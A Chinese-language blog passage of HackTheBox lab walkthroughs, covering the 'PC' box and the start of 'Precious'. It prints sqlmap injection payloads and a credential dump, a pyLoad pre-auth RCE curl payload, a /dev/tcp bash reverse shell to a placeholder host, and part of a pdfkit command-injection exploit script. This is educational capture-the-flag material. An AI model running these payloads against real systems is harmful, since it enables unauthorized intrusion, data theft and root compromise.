0\\x01\\0\\0\\x04\\x08\\SF:0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(SMBProgNeg,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xSF:ff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\SF:0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(X11Probe,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xffSF:\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\SF:0\\0\\0\\0\\0\\?\\0\\0&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purpose|specializedRunning (JUST GUESSING): Linux 5.X|4.X|2.6.X (95%), Crestron 2-Series (86%)OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_seriesAggressive OS guesses: Linux 5.0 (95%), Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 - 5.5 (88%), Crestron XPanel control system (86%)No exact OS matches for host (test conditions non-ideal).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds$ sudo nmap --script=vuln 10.10.11.214Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 05:10 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for 10.10.11.214Host is up (0.075s latency).Not shown: 999 filtered tcp ports (no-response)PORT   STATE SERVICE22/tcp open  sshNmap done: 1 IP address (1 host up) scanned in 45.29 seconds\n\n就发现开了22和50051端口，并且50051端口是啥也没扫出来。没有获得啥太好信息。\n服务探测不管50051端口是啥，我们先浏览器访问一下，结果返回一堆乱码，解码一下好像也是无意义字符。看不出来50051端口到底跑的啥服务。\n看看chatgpt怎么说：\n\n为了防止chatgpt胡说，我们再google一下，发现确实50051是gRPC的默认端口，那么这台机子很有可能就跑的是gRPC服务。\n那我们再google一下gRPC exploit，发现了一篇很详细的介绍了gRPC安全问题的文章。文章中介绍gRPC SQL注入那段很详细的描述了gRPC的利用过程。\n\n虽然我们并不知道这台机子上的gRPC是否存在SQL注入漏洞，但是前面的连接gRPC的步骤是通用的，我们照葫芦画瓢收集下信息再说。当然当务之急是先把grpcurl和grpcui安装好，这个在github上下载对应版本的release即可，有go环境的可以直接用git安装。\ngRPC信息收集$ ./grpcurl -plaintext 10.10.11.214:50051 listSimpleAppgrpc.reflection.v1alpha.ServerReflection$ ./grpcurl -plaintext 10.10.11.214:50051 list SimpleAppSimpleApp.LoginUserSimpleApp.RegisterUserSimpleApp.getInfo\n\n简单的用grpcurl探测一下，发现50051端口上跑着的gRPC服务叫SimpleApp且有三个服务。那我们下一步就是用grpcui与它交互。\n$ ./grpcui -plaintext 10.10.11.214:50051gRPC Web UI available at http://127.0.0.1:37383/\n\n然后我们访问本地网址就能看到页面。\n\n如果我们尝试注册账户，然后利用注册的账号登录，就会返回一个id以及token。\n\n然后我们去用这个id和token去请求getInfo服务，就会返回：\n&#123;  &quot;message&quot;: &quot;Will update soon.&quot;&#125;\n\n它给这id是啥意思，我们再创一个账号发现id是随机的，并不是规律递增，但如果我们请求id&#x3D;1会返回一条不一样的信息：\n&#123;  &quot;message&quot;: &quot;The admin is working hard to fix the issues.&quot;&#125;\n\n这难道暗示id&#x3D;1的账户是admin吗？那我们尝试一下用admin登录一下，弱密码admin:admin一下就成功了。然而好像也没啥用，试了试好像用谁的token都可以任意访问id。\n但换句话说好像也有用，这id的请求感觉没做任何限制很有可能存在脆弱性。加上我们之前看的那篇文章不就是利用gRPC上的SQL注入漏洞嘛，那我们就试试看究竟会不会有这个漏洞。\n我们直接把请求保存成一个request.txt文件（用burpsuite或者火狐直接把请求复制出来都可以）准备用SQLmap看看是否存在漏洞，而且既然有admin权限的我们就用admin权限的，聊胜于无。\n漏洞利用SQLmapsqlmap小测一下。\n$ sudo sqlmap -r request.txt        ___       __H__ ___ ___[,]_____ ___ ___  &#123;1.7.6#stable&#125;|_ -| . [&quot;]     | .&#x27;| . ||___|_  [,]_|_|_|__,|  _|      |_|V...       |_|   https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 08:11:07 /2023-07-16/[08:11:07] [INFO] parsing HTTP request from &#x27;request.txt&#x27;JSON data found in POST body. Do you want to process it? [Y/n/q]Cookie parameter &#x27;_grpcui_csrf_token&#x27; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N][08:11:09] [INFO] resuming back-end DBMS &#x27;sqlite&#x27;[08:11:09] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: JSON id ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;164 AND 9042=9042&quot;&#125;]&#125;    Type: time-based blind    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;164 AND 7649=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))&quot;&#125;]&#125;    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;-8074 UNION ALL SELECT CHAR(113,120,112,118,113)||CHAR(118,74,83,118,77,111,65,111,103,88,73,118,108,116,111,82,73,66,104,82,83,67,77,89,81,73,100,122,118,122,71,75,72,70,76,81,107,117,69,69)||CHAR(113,112,112,106,113)-- ngxu&quot;&#125;]&#125;---[08:11:09] [INFO] the back-end DBMS is SQLiteback-end DBMS: SQLite[08:11:09] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/127.0.0.1&#x27;[*] ending @ 08:11:09 /2023-07-16/\n\n发现后端数据库用的是SQLite且确实存在SQL注入漏洞，在指定--tables以及--columns查看了下大致的表与列真是换，发现数据量不大之后，我们偷懒直接把数据库dump出来（真实情况下请勿dump！dump几十条数据下半辈子就要无忧了）。\n$ sudo sqlmap -r request.txt --dump        ___       __H__ ___ ___[)]_____ ___ ___  &#123;1.7.6#stable&#125;|_ -| . [.]     | .&#x27;| . ||___|_  [.]_|_|_|__,|  _|      |_|V...       |_|   https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 08:13:13 /2023-07-16/[08:13:13] [INFO] parsing HTTP request from &#x27;request.txt&#x27;JSON data found in POST body. Do you want to process it? [Y/n/q]Cookie parameter &#x27;_grpcui_csrf_token&#x27; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N][08:13:15] [INFO] resuming back-end DBMS &#x27;sqlite&#x27;[08:13:15] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: JSON id ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;164 AND 9042=9042&quot;&#125;]&#125;    Type: time-based blind    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;164 AND 7649=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))&quot;&#125;]&#125;    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;-8074 UNION ALL SELECT CHAR(113,120,112,118,113)||CHAR(118,74,83,118,77,111,65,111,103,88,73,118,108,116,111,82,73,66,104,82,83,67,77,89,81,73,100,122,118,122,71,75,72,70,76,81,107,117,69,69)||CHAR(113,112,112,106,113)-- ngxu&quot;&#125;]&#125;---[08:13:15] [INFO] the back-end DBMS is SQLiteback-end DBMS: SQLite[08:13:15] [INFO] fetching tables for database: &#x27;SQLite_masterdb&#x27;[08:13:15] [INFO] fetching columns for table &#x27;messages&#x27;[08:13:15] [INFO] fetching entries for table &#x27;messages&#x27;Database: &lt;current&gt;Table: messages[1 entry]+-----+-------------------+----------+| id  | message           | username |+-----+-------------------+----------+| 164 | Will update soon. | admin    |+-----+-------------------+----------+[08:13:15] [INFO] table &#x27;SQLite_masterdb.messages&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv&#x27;[08:13:15] [INFO] fetching columns for table &#x27;accounts&#x27;[08:13:15] [INFO] fetching entries for table &#x27;accounts&#x27;Database: &lt;current&gt;Table: accounts[2 entries]+------------------------+----------+| password               | username |+------------------------+----------+| admin                  | admin    || ********************** | sau      |+------------------------+----------+[08:13:15] [INFO] table &#x27;SQLite_masterdb.accounts&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv&#x27;[08:13:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/127.0.0.1&#x27;[*] ending @ 08:13:15 /2023-07-16/\n\n我们拿到了一个sau用户的登录凭证，那自然是要去ssh试试的。\n获取立足点$ ssh sau@10.10.11.214sau@10.10.11.214&#x27;s password:Last login: Mon May 15 09:00:44 2023 from 10.10.14.19sau@pc:~$ \n\n发现成功登录，在home目录下拿到了user flag。\n提权上来就发现里面文件乱糟糟的，啥都有，先给机器reset一下再说。\n三连reset完就很清爽。依然是熟悉的sudo -l、find SUID bins以及cat crontab三步走。也依然是熟悉的啥也没发现。\n漏洞发现不管三七二十一先把linpeas以及pspy传上去再说。在我们将其传到&#x2F;tmp目录下，正准备linpeas看一眼的时候，我们发现tmp目录下有个pyLoad目录，不仅如此，它还是root所有的权限为755的目录，这不是邀请我们进去看看吗，却之不恭，看看再说。\nsau@pc:/tmp$ lltotal 3912drwxrwxrwt 15 root root    4096 Jul 16 09:34 ./drwxr-xr-x 21 root root    4096 Apr 27 15:23 ../drwxrwxrwt  2 root root    4096 Jul 16 09:28 .ICE-unix/drwxrwxrwt  2 root root    4096 Jul 16 09:28 .Test-unix/drwxrwxrwt  2 root root    4096 Jul 16 09:28 .X11-unix/drwxrwxrwt  2 root root    4096 Jul 16 09:28 .XIM-unix/drwxrwxrwt  2 root root    4096 Jul 16 09:28 .font-unix/-rwxrwxr-x  1 sau  sau   836190 Jul  2 04:28 linpeas.sh*-rwxrwxr-x  1 sau  sau  3104768 Jan 17 21:09 pspy64*drwxr-xr-x  4 root root    4096 Jul 16 09:28 pyLoad/drwx------  3 root root    4096 Jul 16 09:28 snap-private-tmp/drwx------  3 root root    4096 Jul 16 09:28 systemd-private-d85c45b90a014dc6a8a5f5baa1c3abd3-ModemManager.service-0r4IYg/drwx------  3 root root    4096 Jul 16 09:28 systemd-private-d85c45b90a014dc6a8a5f5baa1c3abd3-systemd-logind.service-pB1Ivg/drwx------  3 root root    4096 Jul 16 09:28 systemd-private-d85c45b90a014dc6a8a5f5baa1c3abd3-systemd-resolved.service-S9bgKi/drwx------  2 root root    4096 Jul 16 09:28 tmps7fk1b_z/drwx------  2 sau  sau     4096 Jul 16 09:33 tmux-1001/drwx------  2 root root    4096 Jul 16 09:28 vmware-root_738-2999591909/sau@pc:/tmp$ cd pyLoad/sau@pc:/tmp/pyLoad$ ls -latotal 20drwxr-xr-x  4 root root 4096 Jul 16 09:28 .drwxrwxrwt 15 root root 4096 Jul 16 09:34 ..drwxr-xr-x  2 root root 4096 Jul 16 09:28 flaskdrwxr-xr-x  2 root root 4096 Jul 16 09:28 jinja-rw-r--r--  1 root root    4 Jul 16 09:28 pyload.pidsau@pc:/tmp/pyLoad$ cat pyload.pid1050sau@pc:/tmp/pyLoad$ ps aux | grep 1050root        1050  0.1  1.4 1215780 58300 ?       Ssl  09:28   0:02 /usr/bin/python3 /usr/local/bin/pyloadsau        21801  0.0  0.0   8160  2544 pts/0    S+   09:50   0:00 grep --color=auto 1050\n\n发现里面有flask和jinja，明显是python模块，此外还专门放了个pyload.pid文件告诉我们pyload运行的pid是105。这pyload是几号人物，给这么多画面。\n好奇宝宝直接进行一个谷歌的查pyload exploit是不是有猫腻。结果我们确实发现了其存在Pre-auth RCE in pyLoad的漏洞。且github上有详细的PoC。\n漏洞定位那么现在是道理我都懂环节了，但是这个pyload究竟跑在哪里，跑在什么端口呢？\n我们直接netstat -nat看一看。\nsau@pc:/tmp$ netstat -natActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         Statetcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTENtcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTENtcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTENtcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTENtcp        0     41 10.10.11.214:22         10.10.14.81:54582       ESTABLISHEDtcp        0     41 10.10.11.214:22         10.10.14.81:54568       ESTABLISHEDtcp        0    208 10.10.11.214:22         10.10.14.96:53820       ESTABLISHEDtcp6       0      0 :::22                   :::*                    LISTENtcp6       0      0 :::50051                :::*                    LISTEN\n\n做个排除法，跑在本地显然不是22，那就是8000或者9666了。\n我们先curl看看8000端口什么情况。\nsau@pc:/tmp$ curl 127.0.0.1:8000&lt;!doctype html&gt;&lt;html lang=en&gt;&lt;title&gt;Redirecting...&lt;/title&gt;&lt;h1&gt;Redirecting...&lt;/h1&gt;&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&quot;&gt;/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&lt;/a&gt;. If not, click the link.\n\n看来是跳转了，我们用ssh端口转发到本地，用浏览器打开看看。\n$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214sau@10.10.11.214&#x27;s password:Last login: Sun Jul 16 09:28:58 2023 from 10.10.14.96sau@pc:~$\n\n访问一下网站：\n\n发现确实是pyload服务，那我们就完成了pyload服务的定位。\nPoC验证我们试试8000端口能否验证PoC。\nsau@pc:/tmp$ curl -i -s -k -X $&#x27;POST&#x27; \\&gt;     --data-binary $&#x27;jk=pyimport%20os;os.system(\\&quot;touch%20/tmp/pwnd\\&quot;);f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27; \\&gt;     $&#x27;http://127.0.0.1:8000/flash/addcrypted2&#x27;HTTP/1.1 500 INTERNAL SERVER ERRORContent-Type: text/html; charset=utf-8Content-Length: 21Access-Control-Max-Age: 1800Access-Control-Allow-Origin: *Access-Control-Allow-Methods: OPTIONS, GET, POSTVary: Accept-EncodingDate: Mon, 17 Jul 2023 03:32:56 GMTServer: Cheroot/8.6.0Could not decrypt keysau@pc:/tmp$ lltotal 56drwxrwxrwt 14 root root 4096 Jul 17 03:32 ./drwxr-xr-x 21 root root 4096 Apr 27 15:23 ../drwxrwxrwt  2 root root 4096 Jul 16 22:36 .ICE-unix/drwxrwxrwt  2 root root 4096 Jul 16 22:36 .Test-unix/drwxrwxrwt  2 root root 4096 Jul 16 22:36 .X11-unix/drwxrwxrwt  2 root root 4096 Jul 16 22:36 .XIM-unix/drwxrwxrwt  2 root root 4096 Jul 16 22:36 .font-unix/-rw-r--r--  1 root root    0 Jul 17 03:32 pwnddrwxr-xr-x  4 root root 4096 Jul 16 22:36 pyLoad/drwx------  3 root root 4096 Jul 16 22:36 snap-private-tmp/drwx------  3 root root 4096 Jul 16 22:36 systemd-private-8676c1abcb0544dcafbf10e3593865c9-ModemManager.service-Zc8bxj/drwx------  3 root root 4096 Jul 16 22:36 systemd-private-8676c1abcb0544dcafbf10e3593865c9-systemd-logind.service-BKbnLh/drwx------  3 root root 4096 Jul 16 22:36 systemd-private-8676c1abcb0544dcafbf10e3593865c9-systemd-resolved.service-jHIx6e/drwx------  2 root root 4096 Jul 16 22:36 tmphwhrrtgk/drwx------  2 root root 4096 Jul 16 22:37 vmware-root_733-4248680474/\n\n一发入魂，虽然返回报了500，但是文件确实以root身份创建了。也就是说我们能以root身份进行任意命令执行。那就简单了，给bash赋s位，写入sudoer都行，但是考虑到是多人共用靶机，我们选用影响最小的方式\n提权到root影响最小的方式当然是反弹shell了，我直接创建一个名叫exp.sh的shell脚本反弹shell。\nsau@pc:/tmp$ echo &#x27;/bin/bash -i &gt;&amp;  /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#x27; &gt; exp.shsau@pc:/tmp$ curl -i -s -k -X $&#x27;POST&#x27;     --data-binary $&#x27;jk=pyimport%20os;os.system(\\&quot;bash%20/tmp/exp.sh&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;     $&#x27;http://127.0.0.1:8000/flash/addcrypted2&#x27;rypted2&#x27;HTTP/1.1 500 INTERNAL SERVER ERRORContent-Type: text/html; charset=utf-8Content-Length: 17467Access-Control-Max-Age: 1800Access-Control-Allow-Origin: *Access-Control-Allow-Methods: OPTIONS, GET, POSTVary: Accept-EncodingDate: Sun, 16 Jul 2023 11:54:22 GMTServer: Cheroot/8.6.0&lt;!DOCTYPE html&gt;......\n\n本地nc监听成功拿到root shell。\n$ nc -nlvp &lt;PORT&gt;listening on [any] &lt;PORT&gt; ...connect to [IP] from (UNKNOWN) [10.10.11.214] 38762bash: cannot set terminal process group (1050): Inappropriate ioctl for devicebash: no job control in this shellroot@pc:~/.pyload/data# cd /rootcd /rootroot@pc:~# lllltotal 68drwx------  7 root root  4096 Apr 27 15:32 ./drwxr-xr-x 21 root root  4096 Apr 27 15:23 ../lrwxrwxrwx  1 root root     9 Jan 11  2023 .bash_history -&gt; /dev/null-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrcdrwxr-xr-x  3 root root  4096 Apr  4 10:25 .cache/drwxr-xr-x  3 root root  4096 Apr  4 10:25 .local/-rw-r--r--  1 root root   161 Dec  5  2019 .profiledrwxr-xr-x  7 root root  4096 Jan 11  2023 .pyload/-rw-------  1 root root  3203 Apr 27 15:32 .viminfodrwxr-xr-x  3 root root  4096 Apr 27 13:15 Downloads/-rw-r-----  1 root root    33 Jul 16 09:28 root.txtdrwx------  3 root root  4096 Jan 11  2023 snap/-rw-r--r--  1 root root 24576 Jan 11  2023 sqlite.db.bak\n\n成功拿到root flag。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[HTB]  Precious","url":"/2023/07/03/Precious/","content":"\n\n\n前言Hack The Box 上的一台机子，比较简单,里面有个yaml的反序列化漏洞利用。\n信息收集┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nmap -sn 10.10.10.128/24              Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:08 CSTNmap scan report for 10.10.10.1Host is up (0.00027s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 10.10.10.2Host is up (0.00018s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 10.10.10.133Host is up (0.00031s latency).MAC Address: 00:0C:29:42:D4:D0 (VMware)Nmap scan report for 10.10.10.254Host is up (0.00028s latency).MAC Address: 00:50:56:E9:4F:0B (VMware)Nmap scan report for 10.10.10.128Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.95 seconds                                                                                             ┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nmap -p- --min-rate=10000 10.10.10.133Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:08 CSTNmap scan report for 10.10.10.133Host is up (0.0013s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 00:0C:29:42:D4:D0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 3.29 seconds                                                                                             ┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nmap -sV -sT -O -p22,80 10.10.10.133                    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:09 CSTNmap scan report for 10.10.10.133Host is up (0.00060s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.18.0 (Ubuntu)MAC Address: 00:0C:29:42:D4:D0 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds                                                                                             ┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nmap --script=vuln 10.10.10.133     Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:10 CSTNmap scan report for 10.10.10.133Host is up (0.00050s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.MAC Address: 00:0C:29:42:D4:D0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 73.44 seconds\n\n总体来说没特别多信息，主要信息就是这台机子开了22和80端口，且OS大概率是Ubuntu。\n在跑nmap的同时，也用nikto扫一下。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nikto -h http://10.10.10.133[sudo] password for kali: - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.10.133+ Target Hostname:    10.10.10.133+ Target Port:        80+ Start Time:         2023-07-03 17:09:49 (GMT8)---------------------------------------------------------------------------+ Server: nginx/1.18.0 (Ubuntu)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Root page / redirects to: http://precious.htb/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).+ 8046 requests: 0 error(s) and 3 item(s) reported on remote host+ End Time:           2023-07-03 17:10:15 (GMT8) (26 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n发现其中说明访问ip会跳转到对应网址，所以我们要把ip对应的网址加入host中，免得网页显示出什么问题。就直接vim /etc/hosts,在里面插入一行10.10.10.133 http://precious.htb/就可以正常访问了。\n也挂了下dirb，也没发现其他的网页。\nwhatweb看一下网页基于的技术栈。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo whatweb http://precious.htb                                               http://precious.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.17], IP[10.10.10.133], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.17], X-XSS-Protection[1; mode=block], nginx[1.18.0]\n\n可以看到网页是基于Phusion Passenger搭建的。在exp-db上搜索相关的exp没发现可以用的。那就先看看网页吧。\nWEB渗透打开网页：\n\n发现是个可以把网页页面转换成PDF的网站。\n如果我们尝试文件包含或者加&#39;,都会显示不是正确的URL。看来不用往这方面考虑了。\n那我们就正常试试效果。我们就输本身的网址试试。\n\n发现会跳转打开一个新窗口并展示页面转换成pdf的结果。\n结果符合我们的预期，但是中间这个跳转的过程发生了什么，是调用了API还是做了什么值得我们研究一下。不管怎样，多打开控制台看看是好习惯。\n我可以发现控制台报了很多警告，其中还有一条很重要的信息。\n\nGenerated by pdfkit v0.8.6这条生成信息说明了网页是调用pdfkit工具实现转pdf操作的，这里甚至还提供了版本信息，那我们直接查下exp-db看看有无可用的exp。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ searchsploit pdfkit  ----------------------------------------------------------- --------------------------------- Exploit Title                                             |  Path----------------------------------------------------------- ---------------------------------pdfkit v0.8.7.2 - Command Injection                        | ruby/local/51293.py----------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n我们可以发现还真有。\n漏洞利用pdfkit我们直接-m拷贝到当前目录并查看其实现。\n#!/usr/bin/env python3# Exploit Title: pdfkit v0.8.7.2 - Command Injection# Date: 02/23/2023# Exploit Author: UNICORD (NicPWNs &amp; Dev-Yeoj)# Vendor Homepage: https://pdfkit.org/# Software Link: https://github.com/pdfkit/pdfkit# Version: 0.0.0-0.8.7.2# Tested on: pdfkit 0.8.6# CVE: CVE-2022–25765# Source: https://github.com/UNICORDev/exploit-CVE-2022-25765# Description: The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.# Importsimport timeimport sysimport requestsfrom urllib.parse import quoteclass color:    red = &#x27;\\033[91m&#x27;    gold = &#x27;\\033[93m&#x27;    blue = &#x27;\\033[36m&#x27;    green = &#x27;\\033[92m&#x27;    no = &#x27;\\033[0m&#x27;# Print UNICORD ASCII Artdef UNICORD_ASCII():    print(rf&quot;&quot;&quot;&#123;color.red&#125;        _ __,~~~&#123;color.gold&#125;/&#123;color.red&#125;_&#123;color.no&#125;        &#123;color.blue&#125;__  ___  _______________  ___  ___&#123;color.no&#125;&#123;color.red&#125;    ,~~`( )_( )-\\|       &#123;color.blue&#125;/ / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\&#123;color.no&#125;&#123;color.red&#125;        |/|  `--.       &#123;color.blue&#125;/ /_/ /    // // /__/ /_/ / , _/ // /&#123;color.no&#125;&#123;color.green&#125;_V__v___&#123;color.red&#125;!&#123;color.green&#125;_&#123;color.red&#125;!&#123;color.green&#125;__&#123;color.red&#125;!&#123;color.green&#125;_____V____&#123;color.blue&#125;\\____/_/|_/___/\\___/\\____/_/|_/____/&#123;color.green&#125;....&#123;color.no&#125;    &quot;&quot;&quot;)# Print exploit help menudef help():    print(r&quot;&quot;&quot;UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command InjectionUsage:  python3 exploit-CVE-2022–25765.py -c &lt;command&gt;  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt;  python3 exploit-CVE-2022–25765.py -c &lt;command&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]  